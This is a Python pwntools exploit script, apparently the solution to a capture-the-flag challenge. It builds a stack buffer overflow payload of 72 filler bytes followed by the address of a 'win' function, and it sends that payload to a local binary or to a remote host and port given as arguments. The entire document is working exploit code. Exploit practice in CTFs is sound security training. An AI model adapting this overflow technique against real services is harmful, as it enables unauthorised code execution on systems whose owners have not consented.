#!/usr/bin/env python3
from pwn import context, ELF, remote, process, flat, log

context.log_level = "info"

BIN = "../attachment/vuln"

elf = ELF(BIN, checksec=False)
win = elf.symbols["win"]

buf_size = 64
saved_rbp = 8
offset = buf_size + saved_rbp

log.info(f"win = {hex(win)}")
log.info(f"offset = {offset}")

payload = flat(
    b"A" * offset,
    win,
)


def exploit(io):
    io.recvuntil(b"Please leave your message:")
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        host = sys.argv[2]
        port = int(sys.argv[3])
        exploit(remote(host, port))
    else:
        exploit(process(BIN))
